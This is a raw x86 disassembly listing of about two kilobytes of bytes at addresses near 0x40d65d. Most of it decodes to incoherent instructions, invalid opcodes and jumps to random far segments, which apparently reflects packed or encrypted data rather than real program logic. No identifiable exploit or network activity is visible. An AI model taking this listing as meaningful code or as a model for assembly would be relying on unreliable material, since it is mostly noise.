  40d65d:	dec    eax
  40d65e:	xabort 0x2a
  40d661:	cmp    BYTE PTR [ecx*2+0x71ec6fa1],cl
  40d668:	fnstenv [ebx-0x7d]
  40d66b:	jecxz  0x40d688
  40d66d:	(bad)  
  40d66e:	fldcw  WORD PTR [ecx+0x4dff9a16]
  40d674:	inc    edx
  40d676:	cld    
  40d677:	jo     0x40d687
  40d679:	xchg   ecx,eax
  40d67a:	sub    BYTE PTR [eax],bl
  40d67c:	add    bh,BYTE PTR [ecx+0x71]
  40d67f:	clc    
  40d680:	add    dl,0x4e
  40d683:	push   ecx
  40d684:	or     ah,BYTE PTR [ebx]
  40d686:	mov    dh,0xd9
  40d688:	xchg   ebp,ecx
  40d68a:	fidiv  DWORD PTR [eax+0x4d2c7bf4]
  40d690:	and    al,0x95
  40d692:	imul   edx,DWORD PTR ds:0x3ce89a83,0x2778ad62
  40d69c:	mov    eax,ds:0xf78df50f
  40d6a1:	add    edi,DWORD PTR [edx]
  40d6a3:	sub    DWORD PTR [ebp+ebx*4-0x729a8b67],0xa9dc621a
  40d6ae:	dec    ecx
  40d6af:	or     edi,esi
  40d6b1:	pop    es
  40d6b2:	outs   dx,DWORD PTR ds:[esi]
  40d6b3:	dec    esp
  40d6b4:	push   0xc3776f2c
  40d6b9:	mov    bh,0x7b
  40d6bb:	cli    
  40d6bc:	dec    edx
  40d6bd:	dec    ecx
  40d6be:	and    al,0xe0
  40d6c0:	out    0x7f,al
  40d6c2:	inc    esi
  40d6c3:	and    eax,0xd8733bcb
  40d6c8:	(bad)  
  40d6ca:	pop    ecx
  40d6cc:	xor    al,0x5d
  40d6ce:	sahf   
  40d6cf:	cdq    
  40d6d0:	sub    al,0x58
  40d6d2:	sbb    al,bl
  40d6d4:	(bad)  
  40d6d5:	mov    eax,ds:0x6bfe685b
  40d6da:	mov    DWORD PTR [edi-0x66],edx
  40d6dd:	jge    0x40d65f
  40d6df:	pusha  
  40d6e0:	mov    WORD PTR [esi-0x708b3af],?
  40d6e6:	cli    
  40d6e7:	add    esi,ecx
  40d6e9:	mov    al,ds:0xbd12aa5a
  40d6ee:	or     ah,ch
  40d6f0:	in     eax,0xcf
  40d6f2:	jbe    0x40d6d0
  40d6f4:	or     BYTE PTR [ebp-0x742ecc93],al
  40d6fa:	dec    ebp
  40d6fb:	or     BYTE PTR [ebp+0x729d0a8c],cl
  40d701:	xor    al,BYTE PTR [eax]
  40d703:	cmp    ecx,eax
  40d705:	jne    0x40d129
  40d70b:	mov    ebx,esi
  40d70d:	jmp    0x40d717
  40d712:	mov    ebx,0x32729d
  40d717:	mov    eax,DWORD PTR [ebp-0x4]
  40d71a:	xor    eax,0x7510856
  40d71f:	add    eax,ebx
  40d721:	mov    DWORD PTR [ebp-0xc],eax
  40d724:	xor    ebx,ebx
  40d726:	lea    eax,[ebp-0x10]
  40d729:	add    ebx,DWORD PTR [eax]
  40d72b:	jmp    0x40d889
  40d730:	xchg   ebp,eax
  40d731:	pop    es
  40d732:	mov    ds:0xa5aabdfe,eax
  40d737:	cmp    eax,0xb6db83b1
  40d73c:	fsub   DWORD PTR [ebx]
  40d73e:	or     esi,DWORD PTR [edx+0x7e7e8001]
  40d744:	aas    
  40d745:	jg     0x40d7c5
  40d747:	jle    0x40d6e2
  40d749:	into   
  40d74a:	or     eax,0x278c1ecc
  40d74f:	jle    0x40d704
  40d751:	aaa    
  40d752:	cld    
  40d753:	out    dx,al
  40d754:	test   eax,0x52a19caf
  40d759:	cmp    cl,BYTE PTR [edi+0x1d]
  40d75c:	inc    esp
  40d75d:	sbb    esi,DWORD PTR [edi-0x1a57f707]
  40d763:	xchg   edx,eax
  40d764:	call   0xaf63:0xa107228f
  40d76b:	mov    WORD PTR [ebx-0x62],cx
  40d76f:	ins    DWORD PTR es:[edi],dx
  40d770:	mov    al,0x83
  40d772:	mov    edi,0x42497168
  40d777:	or     ebx,eax
  40d779:	jmp    0x68b8:0x177b41a5
  40d780:	jbe    0x40d726
  40d782:	popf   
  40d783:	neg    BYTE PTR [edi-0x2f]
  40d786:	in     eax,0x59
  40d788:	xchg   ebp,eax
  40d789:	cld    
  40d78a:	repnz lahf 
  40d78c:	jecxz  0x40d737
  40d78e:	into   
  40d78f:	push   esi
  40d790:	pop    eax
  40d791:	mov    ds:0x91ccc700,eax
  40d796:	int3   
  40d797:	loop   0x40d793
  40d799:	push   edx
  40d79a:	xor    al,0x64
  40d79c:	sbb    ebp,DWORD PTR [ebp-0x58b1fbcd]
  40d7a2:	sti    
  40d7a3:	adc    ecx,DWORD PTR [ecx-0x12]
  40d7a6:	adc    dl,ah
  40d7a8:	stos   DWORD PTR es:[edi],eax
  40d7a9:	jl     0x40d763
  40d7ab:	lock aaa 
  40d7ad:	pop    ebx
  40d7ae:	call   0x9956cede
  40d7b3:	div    DWORD PTR [ebx+esi*8+0x25]
  40d7b7:	xchg   ecx,edi
  40d7b9:	mov    ds:0xbd6ee581,eax
  40d7be:	mov    esp,0x868904bf
  40d7c3:	neg    BYTE PTR [edx-0x65]
  40d7c6:	es aas 
  40d7c8:	adc    dl,BYTE PTR fs:[edi-0x25fa3ee2]
  40d7cf:	dec    ebx
  40d7d0:	sub    al,0x54
  40d7d2:	(bad)  
  40d7d4:	fwait
  40d7d5:	mov    al,ds:0x77658189
  40d7da:	(bad)  
  40d7db:	scas   al,BYTE PTR es:[edi]
  40d7dc:	push   ebx
  40d7dd:	outs   dx,DWORD PTR ds:[esi]
  40d7de:	sbb    al,0xcd
  40d7e0:	adc    cl,cl
  40d7e2:	adc    ebx,DWORD PTR [edx-0x557dd3bd]
  40d7e8:	mov    al,ds:0xf4f8a5a5
  40d7ed:	mov    ebp,0x82d378ba
  40d7f2:	enter  0xf39a,0x80
  40d7f6:	sbb    BYTE PTR [edx+0x35],ch
  40d7f9:	jmp    0x8baf:0x3a0123b6
  40d800:	sub    eax,0xdeafebdc
  40d805:	and    al,dh
  40d807:	push   esp
  40d808:	stos   BYTE PTR es:[edi],al
  40d809:	pop    es
  40d80a:	and    ah,BYTE PTR [esi+0x3]
  40d80d:	daa    
  40d80e:	jne    0x40d7ca
  40d810:	ficom  DWORD PTR [edi+0x4e]
  40d813:	push   0x62
  40d815:	addr16 lahf 
  40d817:	iret   
  40d818:	xchg   ecx,eax
  40d819:	and    al,BYTE PTR [ebx+0x4729f3be]
  40d81f:	icebp  
  40d820:	(bad)  
  40d821:	into   
  40d822:	cs aad 0xee
  40d825:	jne    0x40d7b4
  40d827:	mov    ebx,0xe675e2
  40d82c:	ret    
  40d82d:	sub    eax,DWORD PTR [esi]
  40d82f:	jcxz   0x40d86f
  40d832:	mov    esp,0xd7bab4cb
  40d837:	inc    ebx
  40d838:	jmp    0x40d889
  40d83a:	adc    ecx,ebp
  40d83c:	jno    0x40d7d1
  40d83e:	loopne 0x40d82d
  40d840:	scas   eax,DWORD PTR es:[edi]
  40d841:	(bad)  
  40d842:	add    dh,BYTE PTR [bx+di]
  40d845:	out    0x2f,eax
  40d847:	cs stos BYTE PTR es:[edi],al
  40d849:	enter  0x7b52,0xe2
  40d84d:	loopne 0x40d8a6
  40d84f:	aaa    
  40d850:	repz cmp esi,DWORD PTR ds:0x4ed2ab65
  40d857:	pop    edx
  40d858:	mov    eax,DWORD PTR [eax+eax*4-0x36]
  40d85c:	lock or al,0x8e
  40d85f:	loope  0x40d84f
  40d861:	jo     0x40d8dc
  40d863:	add    dl,BYTE PTR [eax]
  40d865:	mov    ebp,0x80b17a37
  40d86a:	repnz in al,dx
  40d86c:	sahf   
  40d86d:	out    0xd3,al
  40d86f:	(bad)  
  40d870:	in     al,dx
  40d871:	js     0x40d868
  40d873:	outs   dx,BYTE PTR ds:[esi]
  40d874:	sub    al,0x3f
  40d876:	fs sub al,0x72
  40d879:	mov    dh,BYTE PTR [eax]
  40d87b:	xchg   ecx,eax
  40d87c:	int    0xb9
  40d87e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d87f:	inc    edx
  40d880:	add    ch,BYTE PTR [ebx-0x667effdf]
  40d886:	inc    ecx
  40d887:	jmp    0x3414d867
  40d88c:	fucomi st,st(1)
  40d88e:	pop    ecx
  40d88f:	add    DWORD PTR [eax],eax
  40d891:	add    dh,dh
  40d893:	arpl   WORD PTR [ebp+esi*2+0x7d97c57d],dx
  40d89a:	imul   eax,DWORD PTR [edx],0x51
  40d89d:	mov    esi,DWORD PTR [ecx]
  40d89f:	bnd jle 0x40d839
  40d8a2:	ret    0x7e81
  40d8a5:	jle    0x40d8e6
  40d8a7:	jg     0x40d927
  40d8a9:	jle    0x40d89f
  40d8ab:	dec    ebp
  40d8ac:	dec    ebx
  40d8ad:	loop   0x40d84b
  40d8af:	dec    ecx
  40d8b0:	sar    DWORD PTR [edx-0x743ad459],cl
  40d8b6:	in     al,dx
  40d8b7:	scas   eax,DWORD PTR es:[edi]
  40d8b8:	test   dh,0x3a
  40d8bb:	push   edx
  40d8bc:	test   al,0x68
  40d8be:	add    eax,0xc8a946c9
  40d8c3:	cmp    eax,0xdc22302d
  40d8c8:	jbe    0x40d8f4
  40d8ca:	adc    BYTE PTR [esi+ebp*4-0x78476e64],cl
  40d8d1:	das    
  40d8d2:	ret    
  40d8d3:	add    ebp,DWORD PTR [edi-0x55d48744]
  40d8d9:	push   0x3e
  40d8db:	xchg   DWORD PTR [edi],ebp
  40d8dd:	xor    ebx,esi
  40d8df:	jnp    0x40d904
  40d8e1:	call   0xf5a26e6b
  40d8e6:	mov    DWORD PTR [eax+0xa],edx
  40d8e9:	mov    esp,0x1eb91f00
  40d8ee:	fwait
  40d8ef:	out    dx,eax
  40d8f0:	sbb    bh,ah
  40d8f2:	std    
  40d8f3:	sar    BYTE PTR [edx+0x22be135a],1
  40d8f9:	test   BYTE PTR [edx+0x77],cl
  40d8fc:	dec    esp
  40d8fd:	fwait
  40d8fe:	push   ebp
  40d8ff:	mov    ch,0xae
  40d901:	js     0x40d959
  40d903:	jmp    0x40d8d5
  40d905:	imul   BYTE PTR [edx+0x46]
  40d908:	out    dx,eax
  40d909:	mov    ds:0x8145d285,al
  40d90e:	dec    esi
  40d90f:	xchg   esi,eax
  40d910:	data16 jg 0x40d969
  40d913:	loop   0x40d994
  40d915:	add    al,0x8e
  40d917:	sub    BYTE PTR [edi],cl
  40d919:	xor    dl,bh
  40d91b:	cwde   
  40d91c:	pop    eax
  40d91d:	ins    BYTE PTR es:[edi],dx
  40d91e:	rol    BYTE PTR es:[eax+0x29cb2253],0xc1
  40d926:	lods   al,BYTE PTR ds:[esi]
  40d927:	lahf   
  40d928:	mov    bl,0xcb
  40d92a:	not    BYTE PTR [edi-0x18]
  40d92d:	adc    dh,BYTE PTR [ecx-0x6d0c6e83]
  40d933:	popf   
  40d934:	add    ah,bl
  40d936:	ss jnp 0x40d97f
  40d939:	or     dh,ch
  40d93b:	mov    ecx,0xfa8dc9f9
  40d940:	scas   eax,DWORD PTR es:[edi]
  40d941:	nop
  40d942:	(bad)  
  40d943:	xor    al,0xcb
  40d945:	cmp    esi,DWORD PTR ds:0xab43e0c2
  40d94b:	out    dx,al
  40d94c:	fisttp WORD PTR [eax-0x7e]
  40d94f:	push   esp
  40d950:	repnz loopne 0x40d982
  40d953:	repnz pop edx
  40d955:	test   DWORD PTR [edx-0x1778c7a2],ebx
  40d95b:	xor    al,0x3a
  40d95d:	push   eax
  40d95e:	lds    esp,FWORD PTR gs:[esi]
  40d961:	mov    al,ds:0x15fb1c6d
  40d966:	ds je  0x40d926
  40d969:	mov    bh,0x9e
  40d96b:	mov    esi,es
  40d96d:	xor    DWORD PTR [ebx+0x5e],esp
  40d970:	dec    edi
  40d971:	pop    ecx
  40d972:	sti    
  40d973:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d974:	push   edi
  40d975:	dec    ecx
  40d976:	and    BYTE PTR [eax-0x52],ch
  40d979:	or     edx,DWORD PTR [edi]
  40d97b:	popa   
  40d97c:	pop    ecx
  40d97d:	loope  0x40d904
  40d97f:	adc    esi,DWORD PTR [edx]
  40d981:	jmp    0x8d98:0x86427010
  40d988:	mov    bl,0xc4
  40d98a:	(bad)
  40d98d:	pop    edx
  40d98e:	sub    al,0x4b
  40d990:	xchg   ecx,eax
  40d991:	add    ch,dl
  40d993:	pop    edi
  40d994:	cwde   
  40d995:	lods   eax,DWORD PTR ds:[esi]
  40d996:	test   BYTE PTR [esi],0x47
  40d999:	and    BYTE PTR [edx+0x36],dl
  40d99c:	push   ebx
  40d99d:	adc    BYTE PTR [edx],bh
  40d99f:	cmp    DWORD PTR [edx+0xc99cd04],0xffffffdb
  40d9a6:	rcr    DWORD PTR [edx],cl
  40d9a8:	jbe    0x40d9e7
  40d9aa:	(bad)  [edx]
  40d9ac:	push   es
  40d9ad:	(bad)  
  40d9af:	mov    BYTE PTR [edx+0x561b4571],ah
  40d9b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9b6:	icebp  
  40d9b7:	das    
  40d9b8:	jle    0x40d967
  40d9ba:	cmp    DWORD PTR [ecx+0x63],ebp
  40d9bd:	mov    bh,BYTE PTR [edx-0x6e]
  40d9c0:	or     DWORD PTR [esi-0x2382c66b],esi
  40d9c6:	iret   
  40d9c7:	rcl    esi,cl
  40d9c9:	and    eax,DWORD PTR [edi-0x67107b54]
  40d9cf:	stc    
  40d9d0:	push   ds
  40d9d1:	dec    ecx
  40d9d2:	aad    0xc1
  40d9d4:	mov    ecx,0xbe725770
  40d9d9:	outs   dx,DWORD PTR ds:[esi]
  40d9da:	or     eax,0xd55b20df
  40d9df:	push   ds
  40d9e0:	fucomip st,st(5)
  40d9e2:	ficomp DWORD PTR [ebp+0x18b320f]
  40d9e8:	cs popf 
  40d9ea:	sbb    BYTE PTR [ebx-0x17],al
  40d9ed:	pop    ecx
  40d9ee:	add    DWORD PTR [eax],eax
  40d9f0:	add    BYTE PTR [ebx-0xc],dh
  40d9f3:	aas    
  40d9f4:	mov    DWORD PTR [ecx-0x6573b2b3],esi
  40d9fa:	cmp    BYTE PTR [edx+0x77],bl
  40d9fd:	in     al,0xd8
  40d9ff:	xchg   ebp,edx
  40da01:	add    DWORD PTR [edx+0x7f3f7e7e],0x7e
  40da08:	jle    0x40da2e
  40da0a:	rcr    eax,cl
  40da0c:	pop    ss
  40da0d:	mov    eax,ds:0x7195fae3
  40da12:	mov    esi,0x2d9da2d6
  40da17:	sub    eax,0x15f3f3ae
  40da1c:	jae    0x40d9e5
  40da1e:	mov    ebx,DWORD PTR [esi-0x3f]
  40da21:	xchg   ebp,eax
  40da22:	popf   
  40da23:	popa   
  40da24:	test   DWORD PTR ds:0x3e2e16d6,0x5d3b0b6b
  40da2e:	and    bh,cl
  40da30:	mov    ebp,0xa0f86e80
  40da35:	push   esi
  40da36:	sub    DWORD PTR [ecx-0x6c6b8766],ecx
  40da3c:	pusha  
  40da3d:	and    eax,0xa4b843cf
  40da42:	ins    BYTE PTR es:[edi],dx
  40da43:	fiadd  WORD PTR [esi+0x45adf85a]
  40da49:	push   edx
  40da4a:	jno    0x40da32
  40da4c:	mov    ch,BYTE PTR [ecx+ebx*2-0x2a63576f]
  40da53:	outs   dx,DWORD PTR ds:[esi]
  40da54:	ret    
  40da55:	mov    ebx,0xc5d1c345
  40da5a:	pop    ebp
  40da5b:	mov    eax,ds:0x4cfc883
  40da60:	inc    ebx
  40da61:	jmp    0x40da5e
  40da63:	fdiv   st(4),st
  40da65:	(bad)  
  40da66:	push   edx
  40da67:	mov    ebp,0xa6e75dea
  40da6c:	lea    ecx,[ebx]
  40da6e:	enter  0x812,0x64
  40da72:	cdq    
  40da73:	xchg   esp,eax
  40da74:	jecxz  0x40da2f
  40da76:	inc    edx
  40da77:	les    edi,FWORD PTR [ebp+0x22]
  40da7a:	pop    eax
  40da7b:	dec    edx
  40da7c:	pop    edx
  40da7d:	dec    eax
  40da7e:	fbstp  TBYTE PTR ds:[edi]
  40da81:	(bad)  
  40da82:	into   
  40da83:	pushf  
  40da84:	push   esp
  40da85:	imul   ebx,DWORD PTR [edi],0x63
  40da88:	mov    esp,0xc5fdd693
  40da8d:	popf   
  40da8e:	sub    cl,BYTE PTR [ecx]
  40da90:	xchg   esp,eax
  40da91:	test   al,0xd6
  40da93:	aad    0x80
  40da95:	inc    esp
  40da96:	retf   
  40da97:	mov    bl,0xb7
  40da99:	shl    DWORD PTR [ebp-0x3b],1
  40da9c:	and    DWORD PTR [eax-0x5d],0xffffffd6
  40daa0:	dec    edx
  40daa1:	pushf  
  40daa2:	rcl    BYTE PTR [edx-0x726b835f],cl
  40daa8:	(bad)  
  40daaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daab:	ins    BYTE PTR es:[edi],dx
  40daac:	fimul  DWORD PTR [ebp-0x51cc648f]
  40dab2:	inc    edx
  40dab3:	pop    es
  40dab4:	gs sti 
  40dab6:	lds    eax,FWORD PTR [eax+0x79b7ad84]
  40dabc:	jmp    0x40da97
  40dabe:	inc    esi
  40dabf:	mov    ds:0x2b57d7ad,al
  40dac4:	xlat   BYTE PTR ds:[ebx]
  40dac5:	inc    esp
  40dac6:	or     eax,DWORD PTR [edi]
  40dac8:	inc    ecx
  40dac9:	std    
  40daca:	inc    eax
  40dacb:	stos   BYTE PTR es:[edi],al
  40dacc:	popa   
  40dacd:	(bad)  
  40dace:	cmp    al,0x27
  40dad0:	pop    ecx
  40dad1:	mov    esp,0xa0bd16bb
  40dad6:	mov    eax,0xba3ab64b
  40dadb:	sub    BYTE PTR [esi],cl
  40dadd:	mov    dh,0x81
  40dadf:	or     al,cl
  40dae1:	xor    ecx,DWORD PTR [ebx+0x39f348f3]
  40dae7:	inc    ebx
  40dae8:	mov    BYTE PTR [edx-0x29e1c277],dh
  40daee:	jg     0x40daf3
  40daf0:	aas    
  40daf1:	sbb    BYTE PTR [ebx-0x2],bh
  40daf4:	pop    ebp
  40daf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daf6:	sbb    DWORD PTR [edi-0x7c05ae7c],ebp
  40dafc:	(bad)  
  40dafd:	icebp  
  40dafe:	in     al,dx
  40daff:	rcr    DWORD PTR ds:0x9b071fe5,cl
  40db05:	stc    
  40db06:	mov    cl,0xd2
  40db08:	pop    ds
  40db09:	jnp    0x40db24
  40db0b:	ror    DWORD PTR [edx],cl
  40db0d:	and    dh,BYTE PTR [ebp+0x60]
  40db10:	sbb    dh,BYTE PTR [esi+0x1f9de4a5]
  40db16:	fwait
  40db17:	pop    ds
  40db18:	nop
  40db19:	stos   DWORD PTR es:[edi],eax
  40db1a:	pop    ecx
  40db1b:	inc    ecx
  40db1c:	sti    
  40db1d:	jbe    0x40db31
  40db1f:	jmp    0x40daba
  40db21:	or     al,0x8b
  40db23:	stc    
  40db24:	cdq    
  40db25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db26:	pop    ecx
  40db27:	test   DWORD PTR [edx],eax
  40db29:	or     DWORD PTR [edx+0x4c],eax
  40db2c:	xor    al,0x33
  40db2e:	dec    edx
  40db2f:	std    
  40db30:	ds mov edi,0x9b2569dd
  40db36:	sub    al,0x4d
  40db38:	dec    edi
  40db39:	mov    ah,BYTE PTR [esi+0x3]
  40db3c:	aam    0xe6
  40db3e:	pushf  
  40db3f:	or     eax,0x68df31b3
  40db44:	js     0x40db9e
  40db46:	jp     0x40db89
  40db48:	or     al,0x96
  40db4a:	cmp    DWORD PTR [ebp+0x10],ebx
  40db4d:	je     0x40df85
  40db53:	jmp    0x40dcb1
  40db58:	xchg   ebp,eax
  40db59:	mov    BYTE PTR [esi-0x42c354e4],bl
  40db5f:	mov    ecx,0xd105ab5
  40db64:	and    al,0xdd
  40db66:	pop    esi
  40db67:	add    al,BYTE PTR [ebx+eax*4+0x7e]
  40db6b:	jle    0x40dbac
  40db6d:	jg     0x40dbed
  40db6f:	jle    0x40dbd0
  40db71:	dec    BYTE PTR [edx+0xd889ca]
  40db77:	fstp   TBYTE PTR [edi+0x29]
  40db7a:	mov    dh,0xeb
  40db7c:	cwde   
  40db7d:	iret   
  40db7e:	xchg   BYTE PTR [ebx],dl
  40db80:	xchg   ecx,eax
  40db81:	sub    ebp,edi
  40db83:	(bad)  
  40db84:	int    0x56
  40db86:	push   esi
  40db87:	mov    ebx,0x2ae82585
  40db8c:	pop    edx
  40db8d:	mov    ch,0x64
  40db8f:	push   edi
  40db90:	xchg   ebx,eax
  40db91:	cmp    DWORD PTR [ebx-0x1f],esi
  40db94:	xchg   ebx,eax
  40db95:	adc    al,0xd9
  40db97:	out    0xa7,eax
  40db99:	or     BYTE PTR [edx],dh
  40db9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db9c:	cmp    ah,BYTE PTR [ebx+esi*8]
  40db9f:	and    eax,0x73f588c9
  40dba4:	fidiv  DWORD PTR ds:0x5b1b5e90
  40dbaa:	bound  ebx,QWORD PTR [eax]
  40dbac:	xlat   BYTE PTR ds:[ebx]
  40dbad:	pop    edi
  40dbae:	cdq    
  40dbaf:	es adc cl,0x2d
  40dbb3:	mov    eax,0xbdb5558b
  40dbb8:	into   
  40dbb9:	and    ebx,edi
  40dbbb:	cmp    eax,esp
  40dbbd:	lods   eax,DWORD PTR ds:[esi]
  40dbbe:	sub    DWORD PTR [eax+0x1b869aeb],edx
  40dbc4:	and    DWORD PTR [esi-0x7dac49d6],edx
  40dbca:	fild   WORD PTR [eax]
  40dbcc:	mov    ds:0xe9fc7d00,al
  40dbd1:	mov    ds:0xfeb197e4,al
  40dbd6:	stc    
  40dbd7:	adc    ebp,DWORD PTR [eax]
  40dbd9:	ja     0x40dc54
  40dbdb:	test   BYTE PTR [edi-0x78dc3fc3],bl
  40dbe1:	mov    ah,0x2d
  40dbe3:	ins    BYTE PTR es:[edi],dx
  40dbe4:	mov    bl,bl
  40dbe6:	pop    ds
  40dbe7:	mov    dl,bh
  40dbe9:	not    bh
  40dbeb:	(bad)
  40dbef:	(bad)  
  40dbf0:	mov    al,0x1c
  40dbf2:	inc    ebx
  40dbf3:	sbb    BYTE PTR [ecx+0x2ef931a0],0xac
  40dbfa:	pop    eax
  40dbfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbfc:	or     dh,BYTE PTR [eax]
  40dbfe:	xor    eax,0xe2e5b65e
  40dc03:	jb     0x40dbd8
  40dc05:	jne    0x40dbbe
  40dc07:	add    BYTE PTR [ecx],cl
  40dc09:	fcom   st(1)
  40dc0b:	scas   eax,DWORD PTR es:[edi]
  40dc0c:	inc    edx
  40dc0d:	sar    BYTE PTR [eax+eax*2],cl
  40dc10:	adc    al,0xc8
  40dc12:	not    dh
  40dc14:	mov    ch,0xbe
  40dc16:	test   al,0xef
  40dc18:	xor    DWORD PTR [eax],esi
  40dc1a:	xchg   esi,eax
  40dc1b:	test   al,0x8c
  40dc1d:	mov    esp,0x824427b1
  40dc22:	lods   eax,DWORD PTR ds:[esi]
  40dc23:	arpl   cx,dx
  40dc25:	push   edi
  40dc26:	xor    al,0x6c
  40dc28:	popa   
  40dc29:	push   cs
  40dc2a:	jbe    0x40dc0b
  40dc2c:	cmc    
  40dc2d:	lock (bad) 
  40dc2f:	test   eax,0x2fcb634c
  40dc34:	lods   al,BYTE PTR ds:[esi]
  40dc35:	jo     0x40dc5a
  40dc37:	(bad)  
  40dc38:	hlt    
  40dc39:	scas   eax,DWORD PTR es:[edi]
  40dc3a:	adc    BYTE PTR [ebx-0x530b1557],dh
  40dc40:	in     al,dx
  40dc41:	push   ebp
  40dc42:	mov    eax,0x77fcee00
  40dc47:	push   ebp
  40dc48:	fmul   QWORD PTR [ebp+0x6a]
  40dc4b:	pop    ebx
  40dc4c:	repz xchg ebp,eax
  40dc4e:	push   edx
  40dc4f:	push   0xfffffff4
  40dc51:	ret    
  40dc52:	call   0x1133:0x1cd293fd
  40dc59:	call   0xf117:0x14a7df07
  40dc60:	push   edx
  40dc61:	bound  esi,QWORD PTR [eax-0x6e]
  40dc64:	stc    
  40dc65:	test   esi,edx
  40dc67:	cli    
  40dc68:	or     eax,0x5f33d1ad
  40dc6d:	test   DWORD PTR [edi],0x37afcc07
  40dc73:	(bad)  
  40dc74:	jmp    0xa8e1:0x5f14ca52
  40dc7b:	push   edi
  40dc7c:	mov    bl,0xc3
  40dc7e:	nop
  40dc7f:	or     BYTE PTR [eax-0x6caab7b],al
  40dc85:	stc    
  40dc86:	cdq    
  40dc87:	pop    ecx
  40dc88:	rol    DWORD PTR [eax+0x16],1
  40dc8b:	mov    bh,BYTE PTR [ebp+0x57960af3]
  40dc91:	sbb    ebx,DWORD PTR [eax]
  40dc93:	shl    ebx,cl
  40dc95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc96:	repz dec eax
  40dc98:	and    bh,BYTE PTR [esi]
  40dc9a:	xchg   ecx,eax
  40dc9b:	jp     0x40dce6
  40dc9d:	out    dx,al
  40dc9e:	or     edi,ebx
  40dca0:	popf   
  40dca1:	loope  0x40dcea
  40dca3:	pop    ebx
  40dca4:	cwde   
  40dca5:	into   
  40dca6:	push   ecx
  40dca7:	mov    WORD PTR ds:0xe0d298ba,ss
  40dcad:	int    0xc6
  40dcaf:	fsubrp st(7),st
  40dcb1:	xchg   edx,eax
  40dcb2:	jmp    0x40de10
  40dcb7:	dec    eax
  40dcb8:	adc    eax,0xdc7bcafb
  40dcbd:	jns    0x40dc54
  40dcbf:	rcl    BYTE PTR ds:0x77513fe9,cl
  40dcc5:	dec    edx
  40dcc6:	in     al,dx
  40dcc7:	add    eax,0x3f7e7e85
  40dccc:	jg     0x40dd4c
  40dcce:	jle    0x40dc6e
  40dcd0:	mov    dh,0x84
  40dcd2:	dec    esp
  40dcd3:	mov    eax,0xad1db8ad
  40dcd8:	cmp    al,al
  40dcda:	cmp    ebx,DWORD PTR [ebx+0x77]
  40dcdd:	adc    al,0x3e
  40dcdf:	mov    es,edi
  40dce1:	ret    0x3fe0
  40dce4:	cmp    al,0x13
  40dce6:	xchg   DWORD PTR [edx+ebp*8],ecx
  40dce9:	jae    0x40dc89
  40dceb:	cmp    esi,edx
  40dced:	lds    eax,FWORD PTR [ebx-0x6f]
  40dcf0:	neg    BYTE PTR ds:0xd1eb1e77
  40dcf6:	inc    ecx
  40dcf7:	pop    ds
  40dcf8:	shl    DWORD PTR ds:0x17f4227d,cl
  40dcfe:	fld    QWORD PTR [ebx+0x3cc6668a]
  40dd04:	call   0xfcd4392
  40dd09:	xchg   edi,eax
  40dd0a:	sub    bl,al
  40dd0c:	scas   eax,DWORD PTR es:[edi]
  40dd0d:	mov    ah,0xb1
  40dd0f:	in     al,dx
  40dd10:	fild   DWORD PTR [ecx-0x20]
  40dd13:	adc    bl,BYTE PTR [ebx-0x3d813b68]
  40dd19:	in     eax,0xe0
  40dd1b:	in     eax,0x17
  40dd1d:	icebp  
  40dd1e:	push   0xfffffff1
  40dd20:	inc    esi
  40dd21:	sub    dh,al
  40dd23:	cmp    bl,BYTE PTR [ebx+0x7]
  40dd26:	or     BYTE PTR [edx+0x11472168],dh
  40dd2c:	pop    ds
  40dd2d:	mov    dh,0x4d
  40dd2f:	lods   eax,DWORD PTR ds:[esi]
  40dd30:	repnz xchg ecx,eax
  40dd32:	loop   0x40dcbf
  40dd34:	mov    esp,0x5a3dd60a
  40dd39:	cwde   
  40dd3a:	pop    ebx
  40dd3b:	test   edi,eax
  40dd3d:	inc    esp
  40dd3e:	imul   esi,DWORD PTR [ebx+0x3e],0xdf40365
  40dd45:	repnz mov cl,0xb3
  40dd48:	jmp    0x78589320
  40dd4d:	push   ecx
  40dd4e:	push   es
  40dd4f:	mov    dh,0xb8
  40dd51:	xchg   ebp,eax
  40dd52:	mov    esi,0x37703a41
  40dd57:	mov    bh,0xf4
  40dd59:	shl    DWORD PTR [ebp+0x4cb86a7e],1
  40dd5f:	sbb    eax,0x30f7042f
  40dd64:	adc    eax,0xe1033239
  40dd69:	jnp    0x40ddd0
  40dd6b:	lds    esp,FWORD PTR [ecx+0x6443bc7c]
  40dd71:	std    
  40dd72:	sbb    ecx,DWORD PTR [ecx+0x496421ed]
  40dd78:	icebp  
  40dd79:	sub    BYTE PTR [ebx-0x3d],ah
  40dd7c:	push   eax
  40dd7d:	in     eax,dx
  40dd7e:	jae    0x40dd83
  40dd80:	adc    BYTE PTR ds:0x27e6aedc,cl
  40dd86:	cmp    eax,0x8dad6140
  40dd8b:	lods   al,BYTE PTR ds:[esi]
  40dd8c:	mov    fs,WORD PTR [ecx]
  40dd8e:	mov    ebp,0x68ffe3b
  40dd93:	dec    esp
  40dd94:	jb     0x40dd2b
  40dd96:	jle    0x40dd1b
  40dd98:	icebp  
  40dd99:	test   DWORD PTR [edx+0x726c9804],ecx
  40dd9f:	jecxz  0x40dd25
  40dda1:	cdq    
  40dda2:	fnstsw WORD PTR [edx+0x12]
  40dda5:	fnstsw WORD PTR [edx-0x45aabb5c]
  40ddab:	pop    edx
  40ddac:	sti    
  40ddad:	xchg   edi,eax
  40ddae:	mov    eax,0x14d1e337
  40ddb3:	inc    ecx
  40ddb4:	add    DWORD PTR ds:0xaa063862,0x3c8eb089
  40ddbe:	add    cl,BYTE PTR [ecx+0x17]
  40ddc1:	test   DWORD PTR [edi],esp
  40ddc3:	cmp    eax,0x6b245ee
  40ddc8:	mov    al,0xe9
  40ddca:	popa   
  40ddcb:	mov    bh,0xc4
  40ddcd:	add    ecx,DWORD PTR ds:0xb92e5441
  40ddd3:	push   esp
  40ddd4:	push   esi
  40ddd5:	add    ecx,ecx
  40ddd7:	mov    al,ds:0x8e1dda56
  40dddc:	sub    edx,esi
  40ddde:	ins    BYTE PTR es:[edi],dx
